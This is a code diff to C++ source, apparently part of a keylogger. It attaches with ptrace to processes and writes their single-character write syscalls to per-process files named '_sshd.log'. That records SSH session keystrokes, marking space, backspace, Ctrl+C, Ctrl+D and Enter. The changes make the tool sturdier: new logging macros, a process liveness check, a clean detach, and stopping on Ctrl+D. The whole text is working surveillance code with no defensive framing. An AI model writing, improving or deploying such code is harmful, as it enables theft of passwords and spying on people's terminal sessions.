@@ -7,7 +7,7 @@
 #include <sys/syscall.h>
 #include <boost/filesystem/path.hpp>
 
-#include "dbg.h"
+#include "config.hpp"
 
 namespace fs = boost::filesystem;
 
@@ -34,10 +34,11 @@ namespace ptrace_ns{
         log_filename /= std::to_string(pid) + "_sshd.log";
         FILE *fd = std::fopen(log_filename.c_str(), "a+");
         if(!fd){
-            std::cout << "Log-file error: " << log_filename << std::endl;
+            auto log_string = std::string{"Log-file error: "} + log_filename.string();
+            DEBUG_STDERR(log_string);
             return;
         }
-        std::cout << "[PTRACE] Starting attach pid: " << pid << std::endl;
+        DEBUG_STDOUT("[PTRACE] Starting attach pid: " + std::to_string(pid));
         if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return;
         if(waitpid(pid, &status, 0) == -1 ) return;
 
@@ -45,54 +46,60 @@ namespace ptrace_ns{
         ptrace(PTRACE_GETREGS, pid, 0, &state);
         ptrace(PTRACE_SYSCALL, pid, 0, 0);
 
+//        ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);
+
         char str[1000];
         int flag = 1;
-        while(true){
-            waitpid(pid, &status, 0);
-            if(WIFEXITED(status)) break;
+        int res = kill(pid, 0);
+        while(res == 0 || (res < 0 && errno == EPERM)){
             ptrace(PTRACE_GETREGS, pid, 0, &state);
             if(state.orig_rax == SYS_write  && flag && state.rdx == 1){
                 read_addr_into_buff(pid, state.rsi, str, 1000);
                 if(str[0] == 0x20) {
-                    dbg(str[0]);
+                    DEBUG_STDOUT("[SPACE]");
                     std::string s = "[SPACE]";
-                    std::cout << "DATA: " << s << std::endl;
                     std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else if(str[0] == 0x7F) {
-                    dbg(str[0]);
+                    DEBUG_STDOUT("[BACKSPACE]");
                     std::string s = "[BACKSPACE]";
-                    std::cout << "DATA: " << s << std::endl;
                     std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else if(str[0] == 0x03) {
-                    dbg(str[0]);
+                    DEBUG_STDOUT("[Ctrl+C]");
                     std::string s = "[Ctrl+C]";
-                    std::cout << "DATA: " << s << std::endl;
                     std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else if(str[0] == 0x04) {
-                    dbg(str[0]);
+                    DEBUG_STDOUT("[Ctrl+D]");
                     std::string s = "[Ctrl+D]";
-                    std::cout << "DATA: " << s << std::endl;
                     std::fwrite(s.data(), 1, s.size(), fd);
+                    break;
                 }
                 else if(str[0] == 0x0D) {
-                    dbg(str[0]);
+                    DEBUG_STDOUT("[ENTER]");
                     std::string s = "[ENTER]\n";
-                    std::cout << "DATA: " << s << std::endl;
                     std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else {
-                    dbg(str[0]);
-                    printf("DATA: %c \n", str[0]);
+                    DEBUG_STDOUT(std::to_string(str[0]));
                     std::fwrite(str, 1, 1, fd);
                 }
             }
             flag = !flag;
             ptrace(PTRACE_SYSCALL, pid, 0, 0);
+            waitpid(pid, &status, 0);
+/*            std::cout << "STATUS_WIFEXITED:!!!!!!!!!!!" << WIFEXITED(status) << std::endl;
+            std::cout << "STATUS_WSTOPSIG:!!!!!!!!!!!" << WSTOPSIG(status) << std::endl;
+            std::cout << "STATUS_WEXITSTATUS:!!!!!!!!!!!" << WEXITSTATUS(status) << std::endl;
+            std::cout << "STATUS_WTERMSIG:!!!!!!!!!!!" << WTERMSIG(status) << std::endl;
+            std::cout << "STATUS_WIFSIGNALED:!!!!!!!!!!!" << WIFSIGNALED(status) << std::endl;
+            std::cout << "=========================================" << std::endl;*/
+            if (WIFEXITED(status)) break;
+            res = kill(pid, 0);
         }
-        std::cout << "CLOSE_PTRACING!!!!" << std::endl;
+        ptrace(PTRACE_DETACH, pid, 0, 0);
+        DEBUG_STDOUT("CLOSE_PTRACING!!!!");
         std::fclose(fd);
     }
 }
